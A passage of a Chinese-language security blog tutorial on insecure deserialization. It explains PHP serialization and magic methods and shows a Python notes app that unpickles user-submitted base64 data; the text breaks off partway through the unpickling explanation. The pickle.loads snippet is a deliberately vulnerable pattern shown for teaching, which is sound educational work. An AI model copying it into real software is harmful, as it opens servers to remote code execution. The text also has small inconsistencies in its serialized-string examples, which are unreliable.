@@ -1,0 +1,1204 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="反序列化-1">
+<title>反序列化-1</title>
+
+<link rel='canonical' href='https://Yerucrem.github.io/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="反序列化-1">
+<meta property='og:description' content="反序列化-1">
+<meta property='og:url' content='https://Yerucrem.github.io/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/'>
+<meta property='og:site_name' content='夜路归'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-04-24T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-04-24T00:00:00&#43;00:00'/><meta property='og:image' content='https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/girl-8880144_1920.png' />
+<meta name="twitter:title" content="反序列化-1">
+<meta name="twitter:description" content="反序列化-1"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/girl-8880144_1920.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_90a3cb9b20773d8.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💫</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">夜路归</a></h1>
+            <h2 class="site-description">YERUCREM</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#重要概念">重要概念</a>
+      <ol>
+        <li><a href="#序列化">序列化</a></li>
+        <li><a href="#反序列化">反序列化</a></li>
+      </ol>
+    </li>
+    <li><a href="#序列化格式">序列化格式</a>
+      <ol>
+        <li><a href="#php-序列化">PHP 序列化</a></li>
+        <li><a href="#魔法方法">魔法方法</a>
+          <ol>
+            <li><a href="#php">PHP</a></li>
+            <li><a href="#python">PYTHON</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#鉴别">鉴别</a>
+      <ol>
+        <li><a href="#访问源代码">访问源代码</a></li>
+        <li><a href="#无法访问源代码">无法访问源代码</a></li>
+      </ol>
+    </li>
+    <li><a href="#漏洞利用-更新属性">漏洞利用-更新属性</a>
+      <ol>
+        <li><a href="#更新对象的属性">更新对象的属性</a>
+          <ol>
+            <li><a href="#定义-notes-类">定义 Notes 类</a></li>
+            <li><a href="#将用户数据存储在-cookie-中">将用户数据存储在 Cookie 中</a></li>
+            <li><a href="#利用漏洞">利用漏洞</a></li>
+          </ol>
+        </li>
+        <li><a href="#利用漏洞-1">利用漏洞</a></li>
+      </ol>
+    </li>
+    <li><a href="#漏洞利用-对象注入">漏洞利用-对象注入</a>
+      <ol>
+        <li><a href="#准备payload">准备Payload</a></li>
+      </ol>
+    </li>
+    <li><a href="#自动化脚本">自动化脚本</a>
+      <ol>
+        <li><a href="#php-工具链-phpggc">PHP 工具链 (PHPGGC)</a></li>
+        <li><a href="#java-版-ysoserial">Java 版 Ysoserial</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/">
+                
+                    <img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/girl-8880144_1920.png" loading="lazy" alt="Featured image of post 反序列化-1" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web%E5%9F%BA%E7%A1%80/" >
+                web基础
+            </a>
+        
+            <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" >
+                反序列化
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/">反序列化-1</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            反序列化-1
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-04-24</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="重要概念">重要概念
+</h2><h3 id="序列化">序列化
+</h3><p>把序列化想象成早上收拾书包。你需要把书、笔记本、午餐盒和水瓶整理好放进书包里。序列化就像把不同的信息（比如笔记）放在一起，方便存储或发送给朋友。</p>
+<p><img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424132745357.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250424132745357"
+	
+	
+></p>
+<p>在编程中，序列化是将对象的状态转换为人类可读或二进制格式（或两者的混合）的过程，以便根据需要进行存储、传输和重构。对于需要在系统不同部分之间或跨网络传输数据的应用程序（例如基于 Web 的应用程序），此功能至关重要。在 PHP 中，此过程使用 <code>serialize()</code> 函数执行。</p>
+<p><img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424132826851.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250424132826851"
+	
+	
+></p>
+<p><strong>例子</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$noteArray</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;title&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;My THM Note&#34;</span><span class="p">,</span> <span class="s2">&#34;content&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;Welcome to THM!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$serialisedNote</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$noteArray</span><span class="p">);</span>  <span class="c1">// Converting the note into a storable format
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;note.txt&#39;</span><span class="p">,</span> <span class="nv">$serialisedNote</span><span class="p">);</span>  <span class="c1">// Saving the serialised note to a file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>以下输出显示了 <code>note.txt</code> 文件中的序列化字符串，其中包含笔记结构和内容的详细信息。它以一种易于保存或传输的方式存储。</p>
+<p><strong>序列化注释</strong> ： <code>a:2:{s:5:&quot;title&quot;;s:12:&quot;My THM Note&quot;;s:7:&quot;content&quot;;s:12:&quot;Welcome to THM!&quot;;}</code></p>
+<h3 id="反序列化">反序列化
+</h3><p>想象一下，你到了学校，需要用到今天早上打包好的所有东西。反序列化就像你上课时打开书包，把每件物品都拿出来，这样一整天都能用到。当你打开书包去拿书本和午餐时，反序列化会把打包好的数据重新转换成你可以使用的东西。反序列化是将格式化的数据转换回对象的过程。这对于从文件、数据库或网络检索数据，并将其恢复到原始状态以供应用程序使用至关重要。</p>
+<p><img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424132845907.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250424132845907"
+	
+	
+></p>
+<p>按照我们前面的例子，下面是如何在 PHP 中反序列化注释数据：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$serialisedNote</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;note.txt&#39;</span><span class="p">);</span>  <span class="c1">// Reading the serialised note from the file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$noteArray</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$serialisedNote</span><span class="p">);</span>  <span class="c1">// Converting the serialised string back into a PHP array
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;Title: &#34;</span> <span class="o">.</span> <span class="nv">$noteArray</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;Content: &#34;</span> <span class="o">.</span> <span class="nv">$noteArray</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这段代码从文件中读取序列化的笔记，并将其转换回数组，从而有效地重建原始笔记。讨论序列化也需要讨论安全性。就像你不希望有人篡改你的书包一样，不安全的反序列化可能会导致软件应用程序中出现严重的安全漏洞。攻击者可能会篡改序列化对象以执行未经授权的操作或窃取数据。</p>
+<h2 id="序列化格式">序列化格式
+</h2><p>虽然不同的编程语言可能使用不同的关键字和函数进行序列化，但其基本原理是一致的。众所周知，序列化是将对象的状态转换为<strong>易于存储或传输</strong>，并在以后重建的格式的过程。无论是 Java、Python、.NET 还是 PHP ，每种语言都实现了序列化，以适应其环境固有的特定功能或安全措施。</p>
+<p><img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424132956858.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250424132956858"
+	
+	
+></p>
+<p>与利用用户输入的即时处理的其他常见漏洞不同，不安全的反序列化问题涉及与应用程序核心逻辑的更深层次的交互，通常会操纵其组件的基本行为。</p>
+<p>现在，让我们探索如何在不同的语言中明确处理序列化，探索其功能、语法和独特的特性。</p>
+<h3 id="php-序列化">PHP 序列化
+</h3><p>在 PHP 中，序列化是使用 <code>serialize()</code> 函数完成的。此函数将 PHP 对象或数组转换为表示对象数据和结构的字节流。生成的字节流可以包含各种数据类型，例如字符串、数组和对象，从而使其具有唯一性。为了说明这一点，我们以一个笔记应用程序为例，用户可以在其中保存和检索他们的笔记。我们将创建一个名为 <strong>Notes</strong> 的 PHP 类来表示每条笔记，并处理序列化和反序列化。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Notes</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Notescontent</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Notescontent</span> <span class="o">=</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在我们的 Notes 应用中，当用户保存笔记时，我们会使用 PHP 的 <code>serialize()</code> 函数序列化 Notes 类对象。这会将对象转换为可存储在文件或数据库中的字符串表示形式。我们来看看以下序列化 Notes 类对象的代码片段：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$note</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Notes</span><span class="p">(</span><span class="s2">&#34;TEST123&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$serialized_note</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$note</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>序列化后它将生成如下所示的输出</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">O</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;Notes&#34;</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;content&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;TEST123&#34;</span><span class="p">;}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>让我们解码输出：</p>
+<ul>
+<li><code>O:5:&quot;Notes&quot;:1:</code> ：此部分表示序列化数据代表 <strong>Notes</strong> 类的对象，该对象具有一个属性。</li>
+<li><code>s:7:&quot;content&quot;</code> ：这表示属性名称“ <strong>content</strong> ”，长度为 7 个字符。在序列化数据中，字符串用 <code>s</code> 表示，后跟字符串长度，字符串用双引号括起来。整数用 <code>i</code> 表示 ，后跟不带引号的数值。</li>
+<li><code>s:14:&quot;TEST123&quot;</code> ：这是<strong>内容</strong>属性的值，长度为 7 个字符。</li>
+</ul>
+<h3 id="魔法方法">魔法方法
+</h3><h4 id="php">PHP
+</h4><p>PHP 提供了一些在序列化过程中起着至关重要作用的<a class="link" href="https://www.php.net/manual/en/language.oop5.magic.php"  target="_blank" rel="noopener"
+    >魔术方法 </a>。下面列出了一些重要的方法：</p>
+<ul>
+<li><code>__sleep()</code> ：此方法在对象序列化之前调用。它可以清理资源，例如数据库连接，并返回一个需要序列化的属性名称数组。</li>
+<li><code>__wakeup()</code> ：此方法在反序列化时调用。它可以重新建立对象正常运行所需的任何连接。</li>
+<li><code>__serialize()</code> ：从 PHP 7.4 开始，此方法允许您通过返回表示对象序列化形式的数组来自定义序列化数据。</li>
+<li><code>__unserialize()</code> ： <code>__serialize()</code> 的对应函数允许自定义从序列化数据中恢复对象。</li>
+</ul>
+<p><img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424133605647.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250424133605647"
+	
+	
+></p>
+<h4 id="python">PYTHON
+</h4><p>Python 使用名为 <strong>Pickle</strong> 的模块来序列化和反序列化对象。该模块将 Python 对象转换为字节流（反之亦然），使其能够保存到文件或通过网络传输。Pickling 对  Python 开发人员来说是一个强大的工具，因为它可以处理几乎所有类型的 Python 对象，而无需手动处理对象的状态。我们将在 Python 和 PHP 中遵循相同的笔记应用程序。以下是 <code>app.py</code> 类的代码片段：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">serialized_data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;serialized_data&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">notes_obj</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">serialized_data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">message</span> <span class="o">=</span> <span class="s2">&#34;Notes successfully unpickled.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;pickle&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;note_content&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">notes_obj</span><span class="o">.</span><span class="n">add_note</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pickled_content</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">notes_obj</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">serialized_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickled_content</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">binary_data</span> <span class="o">=</span> <span class="s1">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">x</span><span class="si">:</span><span class="s1">02x</span><span class="si">}</span><span class="s1">&#39;</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">pickled_content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">message</span> <span class="o">=</span> <span class="s2">&#34;Notes pickled successfully.&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Pickling Process</strong></p>
+<ul>
+<li><strong>创建 Notes 类</strong> ：该类用于管理笔记列表。它提供了添加笔记和检索所有笔记的方法，方便管理应用程序的状态。</li>
+<li><strong>序列化（Pickling）</strong> ：当用户提交注释时，Notes 类实例（包括所有注释）将使用 <code>pickle.dumps()</code> 进行序列化。此函数将 Python 对象转换为二进制格式，以便 Python 稍后可以将其转换回对象。</li>
+</ul>
+<p><strong>显示序列化数据（Base64 编码）</strong></p>
+<ul>
+<li><strong>为什么使用 base64 编码</strong> ：序列化数据是二进制的，并非在所有环境下都适合安全显示。二进制数据可能包含一些字节，这些字节可能会干扰通信协议（例如 HTTP ）。Base64 是一种将二进制数据转换为纯文本的编码方案。它只使用可读字符，因此即使在不支持二进制数据的通道上传输，也能保证安全。</li>
+<li><strong>编码过程</strong> ：序列化 <code>Notes</code> 对象后，使用 <code>base64.b64encode()</code> 将二进制数据编码为 base64 字符串。此字符串可以安全地显示在 HTML 中，并且易于存储或传输。</li>
+</ul>
+<p><img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424134002274.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250424134002274"
+	
+	
+></p>
+<p><strong>反序列化（Unpickling）</strong></p>
+<ul>
+<li><strong>Base64 解码</strong> ：解封时，首先使用 <code>base64.b64decode()</code> 将 base64 字符串解码回二进制格式。</li>
